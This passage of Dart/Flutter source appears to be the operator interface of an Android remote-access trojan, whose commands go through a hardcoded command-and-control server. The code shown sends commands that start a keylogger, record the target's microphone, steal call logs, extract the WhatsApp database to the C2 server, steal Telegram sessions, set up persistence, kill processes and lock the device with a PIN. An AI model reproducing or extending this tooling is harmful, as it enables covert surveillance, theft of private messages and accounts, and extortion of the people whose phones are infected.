      await Future.delayed(const Duration(seconds: 2));
      final response = await http.get(Uri.parse("http://lalalucuu.alannxd.my.id:3012/api/get-response/${_targetId}"));
      
      if (response.statusCode == 200) {
        var data = jsonDecode(response.body);
        if (data['data'] != null && data['data']['files'] != null) {
          setStateDialog(() {
            files.clear();
            files.addAll(List<Map<String, dynamic>>.from(data['data']['files']));
            loading = false;
          });
        } else {
          setStateDialog(() { loading = false; });
        }
      } else {
        setStateDialog(() { loading = false; });
      }
    } catch (e) {
      setStateDialog(() { loading = false; });
    }
  }

  void _downloadFile(String remotePath) async {
    _addLog("Downloading: $remotePath", LogType.info);
    _sendCommand("download_file", _targetId, extra: remotePath);
    await Future.delayed(const Duration(seconds: 3));
    _addLog("File download initiated. Check response logs.", LogType.success);
  }

  void _deleteFile(String remotePath) async {
    _sendCommand("delete_file", _targetId, extra: remotePath);
    _addLog("Deleting: $remotePath", LogType.warning);
  }

  void _uploadFile() async {
    _showInput("UPLOAD FILE", "upload_file", _targetId, hint: "Local path to upload");
  }

  String _formatFileSize(int bytes) {
    if (bytes < 1024) return "$bytes B";
    if (bytes < 1048576) return "${(bytes / 1024).toStringAsFixed(1)} KB";
    if (bytes < 1073741824) return "${(bytes / 1048576).toStringAsFixed(1)} MB";
    return "${(bytes / 1073741824).toStringAsFixed(1)} GB";
  }

  void _startKeylogger() {
    _sendCommand("start_keylogger", _targetId);
    _addLog("Keylogger activated on target", LogType.warning);
    _keylogNotifier.value = "";
    
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Container(
            width: 320,
            height: 450,
            padding: const EdgeInsets.all(20),
            child: Column(
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _red,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.keyboard, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      "KEYLOGGER ACTIVE",
                      style: TextStyle(
                        color: _ink,
                        fontSize: 14,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                Text("Captured keystrokes will appear here", style: TextStyle(color: _ink.withOpacity(0.5), fontSize: 10)),
                const SizedBox(height: 8),
                Expanded(
                  child: Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: _bg,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: ValueListenableBuilder(
                      valueListenable: _keylogNotifier,
                      builder: (context, String logs, child) {
                        return SingleChildScrollView(
                          child: Text(logs, style: const TextStyle(color: _ink, fontSize: 10, fontFamily: 'monospace')),
                        );
                      },
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () {
                        _sendCommand("stop_keylogger", _targetId);
                        Navigator.pop(context);
                        _addLog("Keylogger stopped", LogType.warning);
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _red,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("STOP", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                      ),
                    ),
                    const SizedBox(width: 8),
                    GestureDetector(
                      onTap: () {
                        Clipboard.setData(ClipboardData(text: _keylogNotifier.value));
                        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Logs copied")));
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _green,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("EXPORT", style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, color: _ink)),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _startMicrophoneRecorder() {
    _sendCommand("start_mic_recording", _targetId);
    _addLog("Microphone recording started", LogType.warning);
    
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _red,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.mic, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      "RECORDING ACTIVE",
                      style: TextStyle(
                        color: _ink,
                        fontSize: 14,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                const Icon(Icons.fiber_manual_record, color: _red, size: 40),
                const SizedBox(height: 12),
                Text("Target microphone is being recorded", style: TextStyle(color: _ink.withOpacity(0.6), fontSize: 11)),
                const SizedBox(height: 16),
                GestureDetector(
                  onTap: () {
                    _sendCommand("stop_mic_recording", _targetId);
                    Navigator.pop(context);
                    _addLog("Recording stopped", LogType.warning);
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                    decoration: BoxDecoration(
                      color: _red,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: const Text("STOP", style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, color: _ink)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showProcessKiller() async {
    _sendCommand("list_processes", _targetId);
    await Future.delayed(const Duration(seconds: 2));
    try {
      final response = await http.get(Uri.parse("http://lalalucuu.alannxd.my.id:3012/api/get-response/${_targetId}"));
      if (response.statusCode == 200) {
        var data = jsonDecode(response.body);
        var processes = data['data']?['processes'] ?? [];
        
        showDialog(
          context: context,
          builder: (context) => Dialog(
            backgroundColor: Colors.transparent,
            child: _buildNeoCard(
              child: Container(
                width: 320,
                height: 450,
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _orange,
                            borderRadius: BorderRadius.circular(4),
                            border: Border.all(color: _ink, width: 2),
                          ),
                          child: const Icon(Icons.bug_report, color: _ink, size: 18),
                        ),
                        const SizedBox(width: 8),
                        const Text(
                          "PROCESS KILLER",
                          style: TextStyle(
                            color: _ink,
                            fontSize: 14,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 2,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Expanded(
                      child: ListView.builder(
                        itemCount: processes.length,
                        itemBuilder: (ctx, idx) {
                          var proc = processes[idx];
                          return Container(
                            margin: const EdgeInsets.only(bottom: 4),
                            child: _buildNeoCard(
                              child: ListTile(
                                leading: Icon(Icons.build, color: _ink.withOpacity(0.5), size: 14),
                                title: Text(proc['name'] ?? "Unknown", style: const TextStyle(color: _ink, fontSize: 11)),
                                trailing: GestureDetector(
                                  onTap: () {
                                    _sendCommand("kill_process", _targetId, extra: proc['pid'].toString());
                                    _addLog("Killing process: ${proc['name']}", LogType.warning);
                                    Navigator.pop(context);
                                  },
                                  child: Container(
                                    padding: const EdgeInsets.all(6),
                                    decoration: BoxDecoration(
                                      color: _red,
                                      shape: BoxShape.circle,
                                      border: Border.all(color: _ink, width: 2),
                                    ),
                                    child: const Icon(Icons.close, color: _ink, size: 14),
                                  ),
                                ),
                              ),
                            ),
                          );
                        },
                      ),
                    ),
                    const SizedBox(height: 8),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _bg,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("CLOSE", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        );
      }
    } catch (e) {
      _addLog("Failed to fetch processes: $e", LogType.error);
    }
  }

  void _startNotificationSpammer() {
    _showInput("NOTIFICATION SPAM", "spam_notification", _targetId, hint: "Title|Message|Count");
  }

  void _startClipboardMonitor() {
    _sendCommand("monitor_clipboard", _targetId);
    _addLog("Clipboard monitoring activated", LogType.info);
    
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
        content: Text("Monitoring target clipboard..."),
        duration: Duration(seconds: 3),
      ),
    );
  }

  void _fetchCallLogs() async {
    _sendCommand("get_call_logs", _targetId);
    await Future.delayed(const Duration(seconds: 3));
    try {
      final response = await http.get(Uri.parse("http://lalalucuu.alannxd.my.id:3012/api/get-response/${_targetId}"));
      if (response.statusCode == 200) {
        var data = jsonDecode(response.body);
        var calls = data['data']?['calls'] ?? [];
        
        showDialog(
          context: context,
          builder: (context) => Dialog(
            backgroundColor: Colors.transparent,
            child: _buildNeoCard(
              child: Container(
                width: 360,
                height: 480,
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _blue,
                            borderRadius: BorderRadius.circular(4),
                            border: Border.all(color: _ink, width: 2),
                          ),
                          child: const Icon(Icons.phone, color: _ink, size: 18),
                        ),
                        const SizedBox(width: 8),
                        const Text(
                          "CALL LOGS",
                          style: TextStyle(
                            color: _ink,
                            fontSize: 14,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 2,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Expanded(
                      child: ListView.builder(
                        itemCount: calls.length,
                        itemBuilder: (ctx, idx) {
                          var call = calls[idx];
                          IconData callIcon = call['type'] == "INCOMING" ? Icons.call_received : (call['type'] == "OUTGOING" ? Icons.call_made : Icons.call_missed);
                          Color callColor = call['type'] == "INCOMING" ? _green : (call['type'] == "OUTGOING" ? _blue : _red);
                          
                          return Container(
                            margin: const EdgeInsets.only(bottom: 4),
                            child: _buildNeoCard(
                              child: ListTile(
                                leading: Icon(callIcon, color: callColor, size: 18),
                                title: Text(call['number'] ?? "Unknown", style: const TextStyle(color: _ink, fontSize: 11)),
                                subtitle: Text(_formatTimestamp(call['date']), style: TextStyle(color: _ink.withOpacity(0.4), fontSize: 9)),
                                trailing: Text("${call['duration'] ?? 0}s", style: TextStyle(color: callColor, fontSize: 9, fontWeight: FontWeight.w900)),
                              ),
                            ),
                          );
                        },
                      ),
                    ),
                    const SizedBox(height: 8),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _bg,
                              borderRadius: BorderRadius.circular(4),
                              border: Border.all(color: _ink, width: 2),
                            ),
                            child: const Text("CLOSE", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => _exportCallLogs(calls),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _yellow,
                              borderRadius: BorderRadius.circular(4),
                              border: Border.all(color: _ink, width: 2),
                            ),
                            child: const Row(
                              children: [
                                Icon(Icons.download, size: 14, color: _ink),
                                SizedBox(width: 6),
                                Text("EXPORT", style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, color: _ink)),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          ),
        );
      }
    } catch (e) {
      _addLog("Failed to fetch call logs: $e", LogType.error);
    }
  }

  void _exportCallLogs(List calls) {
    StringBuffer buffer = StringBuffer();
    buffer.writeln("=== CALL LOGS EXPORT ===\n");
    for (var call in calls) {
      buffer.writeln("Number: ${call['number']}");
      buffer.writeln("Type: ${call['type']}");
      buffer.writeln("Duration: ${call['duration']}s");
      buffer.writeln("Date: ${_formatTimestamp(call['date'])}");
      buffer.writeln("---");
    }
    Clipboard.setData(ClipboardData(text: buffer.toString()));
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Call logs exported"), duration: Duration(seconds: 2)));
  }

  void _extractWhatsApp() {
    _sendCommand("extract_whatsapp", _targetId);
    _addLog("WhatsApp database extraction initiated", LogType.warning);
    
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _green,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.chat, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      "WA EXTRACTOR",
                      style: TextStyle(
                        color: _ink,
                        fontSize: 14,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                const Icon(Icons.warning_amber, color: _orange, size: 40),
                const SizedBox(height: 12),
                Text("This may take several minutes", style: TextStyle(color: _ink.withOpacity(0.6), fontSize: 11)),
                Text("Database will be uploaded to C2 server", style: TextStyle(color: _ink.withOpacity(0.6), fontSize: 11)),
                const SizedBox(height: 16),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 8),
                    decoration: BoxDecoration(
                      color: _yellow,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: const Text("OK", style: TextStyle(fontSize: 11, fontWeight: FontWeight.w900, color: _ink)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _stealTelegram() {
    _sendCommand("steal_telegram", _targetId);
    _addLog("Telegram session stealing initiated", LogType.info);
  }

  void _enablePersistence() {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _green,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.power_settings_new, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      "PERSISTENCE",
                      style: TextStyle(
                        color: _ink,
                        fontSize: 14,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                const Text("Choose persistence method:", style: TextStyle(color: _ink, fontSize: 12, fontWeight: FontWeight.w700)),
                const SizedBox(height: 12),
                GestureDetector(
                  onTap: () {
                    _sendCommand("persistence_startup", _targetId);
                    Navigator.pop(context);
                    _addLog("Startup persistence enabled", LogType.success);
                  },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _blue,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.start, size: 16, color: _ink),
                        SizedBox(width: 8),
                        Text("STARTUP FOLDER", style: TextStyle(color: _ink, fontSize: 12, fontWeight: FontWeight.w900)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                GestureDetector(
                  onTap: () {
                    _sendCommand("persistence_registry", _targetId);
                    Navigator.pop(context);
                    _addLog("Registry persistence enabled", LogType.success);
                  },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _purple,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.app_registration, size: 16, color: _ink),
                        SizedBox(width: 8),
                        Text("REGISTRY RUN", style: TextStyle(color: _ink, fontSize: 12, fontWeight: FontWeight.w900)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                GestureDetector(
                  onTap: () {
                    _sendCommand("persistence_scheduler", _targetId);
                    Navigator.pop(context);
                    _addLog("Task Scheduler persistence enabled", LogType.success);
                  },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _orange,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.schedule, size: 16, color: _ink),
                        SizedBox(width: 8),
                        Text("TASK SCHEDULER", style: TextStyle(color: _ink, fontSize: 12, fontWeight: FontWeight.w900)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    decoration: BoxDecoration(
                      color: _bg,
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: _ink, width: 2),
                    ),
                    child: const Text("CANCEL", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  String _formatTimestamp(dynamic timestamp) {
    try {
      DateTime date = timestamp is int ? DateTime.fromMillisecondsSinceEpoch(timestamp) : (timestamp is String ? DateTime.parse(timestamp) : DateTime.now());
      return "${date.day}/${date.month}/${date.year} ${date.hour}:${date.minute.toString().padLeft(2, '0')}";
    } catch (e) {
      return "";
    }
  }

  // ==================== LOCK INPUT ====================
  void _showLockInput(String title, String cmd, String targetId) {
    TextEditingController messageController = TextEditingController();
    TextEditingController passwordController = TextEditingController();
    
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _red,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.lock, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      title,
                      style: const TextStyle(
                        color: _ink,
                        fontSize: 16,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Container(
                  decoration: BoxDecoration(
                    color: _bg,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: _ink, width: 2),
                  ),
                  child: TextField(
                    controller: messageController,
                    style: const TextStyle(color: _ink, fontSize: 13, fontWeight: FontWeight.w700),
                    cursorColor: _ink,
                    decoration: InputDecoration(
                      hintText: "Pesan (contoh: SYSTEM LOCKED)",
                      hintStyle: TextStyle(color: _ink.withOpacity(0.3), fontSize: 12),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Container(
                  decoration: BoxDecoration(
                    color: _bg,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: _ink, width: 2),
                  ),
                  child: TextField(
                    controller: passwordController,
                    style: const TextStyle(color: _ink, fontSize: 13, fontWeight: FontWeight.w700),
                    cursorColor: _ink,
                    obscureText: true,
                    decoration: InputDecoration(
                      hintText: "PIN (contoh: 0812)",
                      hintStyle: TextStyle(color: _ink.withOpacity(0.3), fontSize: 12),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _bg,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("CANCEL", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () {
                        String message = messageController.text.trim();
                        String password = passwordController.text.trim();
                        if (password.isEmpty) password = "0812";
                        if (message.isEmpty) message = "SYSTEM LOCKED";
                        String extra = "$message|$password";
                        _sendCommand(cmd, targetId, extra: extra);
                        Navigator.pop(context);
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(
                          color: _red,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("LOCK", style: TextStyle(fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2, color: _ink)),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ==================== VIDEO LANDSCAPE WIDGET ====================
  Widget _buildLandscapeVideo() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      height: 200,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: _ink, width: 3),
        boxShadow: const [
          BoxShadow(color: _ink, offset: Offset(6, 6)),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(0),
        child: Stack(
          fit: StackFit.expand,
          children: [
            if (_isVideoInitialized)
              VideoPlayer(_videoController)
            else
              Container(
                color: _white,
                child: const Center(
                  child: CircularProgressIndicator(color: _ink),
                ),
              ),
            Positioned(
              bottom: 12,
              right: 12,
              child: GestureDetector(
                onTap: () {
                  setState(() {
                    if (_videoController.value.isPlaying) {
                      _videoController.pause();
                    } else {
                      _videoController.play();
                    }
                  });
                },
                child: Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: _white,
                    shape: BoxShape.circle,
                    border: Border.all(color: _ink, width: 2),
                  ),
                  child: Icon(
                    _videoController.value.isPlaying ? Icons.pause : Icons.play_arrow,
                    color: _ink,
                    size: 20,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ==================== UI COMPONENTS ====================

  Widget _buildTopHeader() {
    String modelText = _targetModel.split(' ').first.toUpperCase();
    String idText = _targetId.length > 10 ? _targetId.substring(0, 10).toUpperCase() : _targetId.toUpperCase();
    String uidText = _targetUID.isNotEmpty ? "UID: $_targetUID" : "UID: N/A";

    return Container(
      padding: EdgeInsets.only(top: MediaQuery.of(context).padding.top + 12, left: 16, right: 16, bottom: 12),
      decoration: BoxDecoration(
        color: _bg,
        border: Border(
          bottom: BorderSide(color: _ink, width: 3),
        ),
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 45,
              height: 45,
              decoration: BoxDecoration(
                color: _white,
                borderRadius: BorderRadius.circular(4),
                border: Border.all(color: _ink, width: 3),
                boxShadow: const [
                  BoxShadow(color: _ink, offset: Offset(3, 3)),
                ],
              ),
              child: const Icon(Icons.arrow_back_ios_new, color: _ink, size: 18),
            ),
          ),
          const SizedBox(width: 16),
          Container(
            width: 55,
            height: 55,
            decoration: BoxDecoration(
              color: _blue,
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: _ink, width: 3),
              boxShadow: const [
                BoxShadow(color: _ink, offset: Offset(3, 3)),
              ],
            ),
            child: const Icon(Icons.phone_android, color: _ink, size: 28),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "NCR- $modelText",
                  style: const TextStyle(
                    color: _ink,
                    fontWeight: FontWeight.w900,
                    fontSize: 15,
                    letterSpacing: 2,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  idText,
                  style: const TextStyle(
                    color: _ink,
                    fontSize: 13,
                    fontWeight: FontWeight.w700,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  uidText,
                  style: TextStyle(
                    color: _ink.withOpacity(0.5),
                    fontSize: 9,
                    fontWeight: FontWeight.w700,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          Container(
            width: 45,
            height: 45,
            decoration: BoxDecoration(
              color: _isConnected ? _green : _red,
              border: Border.all(color: _ink, width: 3),
              borderRadius: BorderRadius.circular(4),
            ),
            child: Icon(
              _isConnected ? FontAwesomeIcons.link as IconData : FontAwesomeIcons.linkSlash as IconData,
              color: _ink,
              size: 18,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildQuickStatusRow() {
    int batLevel = _deviceData.containsKey('battery') ? _parseBattery(_deviceData['battery']) : 41;
    String status = _deviceData['status']?.toString() ?? "Unknown";
    Color statusColor = status == "Online" ? _green : _red;
    
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      child: Row(
        children: [
          _statusBadge(FontAwesomeIcons.batteryFull as IconData, "$batLevel%", _getBatteryColor(batLevel)),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.android as IconData, "Android", _blue),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.shieldHalved as IconData, status, statusColor),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.eye as IconData, "Visible", _purple),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.wifi as IconData, "UID: $_targetUID", _orange),
        ],
      ),
    );
  }

  Widget _statusBadge(IconData icon, String text, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: color,
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: _ink, width: 2),
        boxShadow: const [
          BoxShadow(color: _ink, offset: Offset(3, 3)),
        ],
      ),
      child: Row(
        children: [
          Icon(icon, color: _ink, size: 12),
          const SizedBox(width: 6),
          Text(
            text,
            style: const TextStyle(
              color: _ink,
              fontSize: 10,
              fontWeight: FontWeight.w900,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTerminalLogs() {
    return Container(
      height: 120,
      margin: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: _ink, width: 3),
      ),
      child: _buildNeoCard(
        child: ListView.builder(
          controller: _logScrollController,
          reverse: true,
          padding: const EdgeInsets.all(12),
          itemCount: _executionLogs.length,
          itemBuilder: (context, i) {
            final log = _executionLogs[_executionLogs.length - 1 - i];
            return Padding(
              padding: const EdgeInsets.symmetric(vertical: 2),
              child: Row(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    "[${_formatTime(log.timestamp)}]",
                    style: TextStyle(color: _ink.withOpacity(0.5), fontSize: 8, fontFamily: 'monospace'),
                  ),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      log.message,
                      style: TextStyle(color: _getLogColor(log.type), fontSize: 9, fontFamily: 'monospace'),
                    ),
                  ),
                ],
              ),
            );
          },
        ),
      ),
    );
  }

  Widget _groupLabel(String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 5),
      child: Row(
        children: [
          Text(
            text,
            style: const TextStyle(
              color: _ink,
              fontSize: 10,
              fontWeight: FontWeight.w900,
              letterSpacing: 2,
            ),
          ),
          const SizedBox(width: 8),
          Expanded(child: Container(height: 2, color: _ink)),
        ],
      ),
    );
  }

  Widget _actionButton(String label, IconData icon, Color color, String cmd,
      {bool isInput = false, bool isCustom = false, bool isPage = false,
      Widget? destination, String? inputHint, VoidCallback? onCustomTap}) {
    return InkWell(
      onTap: () {
        if (onCustomTap != null) {
          onCustomTap();
        } else if (cmd == "start_live_camera") {
          _sendCommand(cmd, _targetId);
          _showLiveCameraDialog();
        } else if (isCustom) {
          _showCustomCommandDialog();
        } else if (isPage && destination != null) {
          if (cmd.isNotEmpty) {
            _sendCommand(cmd, _targetId);
          }
          Navigator.push(context, MaterialPageRoute(builder: (context) => destination));
        } else if (isInput) {
          if (cmd == "lock_type1" || cmd == "lock_type2") {
            _showLockInput(label, cmd, _targetId);
          } else {
            _showInput(label, cmd, _targetId, hint: inputHint);
          }
        } else {
          _sendCommand(cmd, _targetId);
        }
      },
      borderRadius: BorderRadius.circular(4),
      child: Container(
        width: MediaQuery.of(context).size.width / 3 - 15,
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: color,
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: _ink, width: 3),
          boxShadow: const [
            BoxShadow(color: _ink, offset: Offset(4, 4)),
          ],
        ),
        child: Column(
          children: [
            Icon(icon, color: _ink, size: 22),
            const SizedBox(height: 6),
            Text(
              label,
              style: const TextStyle(
                color: _ink,
                fontSize: 9,
                fontWeight: FontWeight.w900,
              ),
              textAlign: TextAlign.center,
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
          ],
        ),
      ),
    );
  }

